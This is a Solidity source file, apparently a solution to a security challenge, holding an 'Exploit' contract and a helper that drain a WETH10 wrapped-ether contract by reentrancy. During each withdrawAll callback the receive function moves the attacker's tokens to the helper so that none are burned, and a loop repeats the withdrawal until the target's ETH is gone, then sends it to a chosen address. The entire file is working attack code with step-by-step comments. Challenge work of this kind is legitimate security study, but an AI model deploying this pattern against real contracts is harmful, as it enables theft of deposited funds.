// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {WETH10} from "./WETH10.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract TempHolder {
    WETH10 weth10;

    constructor(WETH10 _weth10) {
        weth10 = _weth10;
    }

    function withdraw() external {
        weth10.transfer(msg.sender, weth10.balanceOf(address(this)));
    }
}

contract Exploit {
    WETH10 weth10;
    TempHolder tmpHolder;

    constructor(WETH10 _weth10) {
        weth10 = _weth10;
        tmpHolder = new TempHolder(_weth10);
    }

    receive() external payable {
        // When we receive ETH from WETH10, transfer the WETH10 balance to the temporary holder contract. Then when the receive function closes and WETH10 contract continues execution, it will read the balance of this contract to determine the amount of WETH10 tokens to burn and it will return 0
        weth10.transfer(address(tmpHolder), weth10.balanceOf(address(this)));
    }

    function _runExploit() internal {
        weth10.deposit{value: address(this).balance}();

        while (address(weth10).balance > 0) {
            // Refetch the WETH10 tokens from the temporary holder
            tmpHolder.withdraw();

            // Call withdrawAll again, to get the ETH value of the weth tokens, this will trigger the receive callback, which will transfer the Weth10 tokens to the temporary holder contract
            weth10.withdrawAll();
        }
    }

    function exploit(address payable to) external payable {
        _runExploit();

        Address.sendValue(to, address(this).balance);
    }
}
